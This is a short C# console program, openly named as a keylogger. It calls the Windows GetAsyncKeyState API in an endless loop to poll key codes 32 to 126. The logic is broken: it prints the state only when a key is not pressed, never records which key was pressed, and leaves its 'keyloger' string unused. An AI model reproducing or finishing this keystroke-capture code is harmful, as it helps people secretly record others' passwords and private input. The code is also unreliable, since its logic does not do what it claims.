using System;
using System.Runtime.InteropServices;
using System.Linq;
using System.Collections.Generic;
using System.Threading.Tasks;
using System.Threading;


namespace keylogger 

{
    class Program 

    {
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(int i);
        static string keyloger = "";
        static void Main(string[] args) 
        {
            while(true)
            {
                Thread.Sleep(5);
                for(int i=32; i<127; i++)
                {
                    int keyState = GetAsyncKeyState(i);
                    if (keyState==0) 
                    {
                        System.Console.WriteLine(keyState + ",");
                        System.Console.WriteLine("");
                    }
                }
            }
        }
    }
}